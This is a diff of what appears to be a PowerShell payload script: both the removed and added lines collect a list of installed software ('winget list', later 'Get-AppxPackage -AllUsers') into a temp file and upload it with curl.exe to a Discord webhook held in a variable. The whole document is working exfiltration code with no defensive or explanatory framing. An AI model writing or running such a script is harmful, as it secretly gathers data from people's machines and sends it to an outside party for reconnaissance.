@@ -1,1 +1,1 @@
-function UploadDiscord { [CmdletBinding()] param ( [parameter(Position = 0, Mandatory = $False)] [string]$file); $hookurl = $dc; curl.exe -F "file1=@$file" $hookurl }; winget list | Out-File -FilePath "$env:USERPROFILE\AppData\Local\Temp\a.txt"; UploadDiscord -file "$env:USERPROFILE\AppData\Local\Temp\a.txt"
+$hookurl = $dc; Get-AppxPackage -AllUsers | Out-File -FilePath "$env:USERPROFILE\AppData\Local\Temp\a.txt";curl.exe -F "file1=@$env:USERPROFILE\AppData\Local\Temp\a.txt" $hookurl;
